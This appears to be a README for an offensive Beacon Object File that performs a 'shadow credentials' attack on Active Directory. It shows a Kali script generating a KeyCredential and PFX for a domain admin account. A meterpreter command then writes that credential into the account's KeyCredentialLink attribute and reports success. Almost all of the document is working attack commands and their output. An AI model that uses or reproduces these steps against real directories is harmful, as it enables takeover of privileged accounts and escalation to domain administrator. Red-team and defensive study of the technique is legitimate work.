# BOF to set shadow creds on target account

# Instructions

Run the `gencert.py` python script with the DN of the user you're setting shadow creds for

```
┌──(kali㉿sccm-kali)-[~/ldap_bofs/bofwhisker]
└─$ uv run gencert.py CN=domainadmin,CN=Users,DC=unsigned-sh0rt,DC=net
KeyCredential: B:828:000200002000010247e54018f597c24bfe460eefacea1f1d68572635bf689fc2a46183d9d593a2200002a32418ad5ac4886e52c77fa8534295a9e49cdbe44d940473ef2357c500ee05e71b01035253413100080000030000000001000000000000000000000100019becd0dd8815ff93ecb0bde3df202492508a5e20b8d320bd1e89bc2239295b1a9fdedf7ee6f301c10aefbaebd50aada7072dbe18ee1436b39dc56e34cbd3e2b2ee20334bfaacef2bd8a622c1f79fe9f62349d22e86337c3d800a713a01e566dded5199be7c5914559fff6b0c38127cfeb0c126ef54d9ae3b29068dcaae4f09ef8f3a712443216dbc50739bfabab7c3d105068d9ffe06cb1c6fbf318944957111fc653b8a4569d3be1e555ad072627ce2abb4ff0767c4a808583d35af48a0f04b62d5831e0cd31fccd49673b047b15b980a8fc210ebe9bea3d287fbfc2d38f103826ce7795e0bfdb35ec0480d247d57c3585c5d216e0dff4a224382fa2a83310f01000401010005001000064953e8a81353dcac8a7d8787c1f88a9902000701000800083679455f1d21dc010800093679455f1d21dc01:CN=domainadmin,CN=Users,DC=unsigned-sh0rt,DC=net
Converting PEM -> PFX with cryptography: CjDY8KOC.pfx
[+] PFX: CjDY8KOC.pfx
```

Execute the BOF with three arguments:
 - target domain
 - target DN of the account you're setting shadow creds on
 - key cred ouput from `gencert.py`

```
meterpreter > execute_bof bofwhisker/keycred.x64.o --format-string zzz unsigned-sh0rt.net "CN=domainadmin,CN=Users,DC=unsigned-sh0rt,DC=net" "B:828:0002000020000127319ae78e74133238d08201dd694f784b7b0c6840d98cde9146143fe48e1e7d200002462bd10010be3c8310c82acae0363ada56a0b2d5722af82f9a8161d5c9867d051b0103525341310008000003000000000100000000000000000000010001ac20164e0954b82afa4f062fd1c70201e844b88bd6138ae4ea24858c6550dce1a1f6924013999643aa33733e2763fd75beb5d21e66485c5f468562eb0f513e4e80cb55ab320777455ba32b452be02747f62747be4d28554bb09605ab2912a99c24bf93a7d50d440943de9666e8166b7694c51ebdd2cee044a48140ca2ba39445e89aeabf1c7a1cd67dc167395eaa70570ab28d978f5934da88d5962bebee3d778930e19436d79f627f09de2256545bc63c620086e1c430be4d5878c4adcc1c496901256c374f0acbd857f08a06d56fbe7099e0e5f66651a50ea1cb936b87509c8ef02bce18a11b88a10fc3748983ef40ac429fab9e79ad97848e9add9e34e9950100040101000500100006fd155b3243475e7b169c8444ecaac610020007010008000860be8cf40f21dc0108000960be8cf40f21dc01:CN=domainadmin,CN=Users,DC=unsigned-sh0rt,DC=net"
Adding KeyCredentialLink to: CN=domainadmin,CN=Users,DC=unsigned-sh0rt,DC=net
KeyCredentialLink added successfully
```
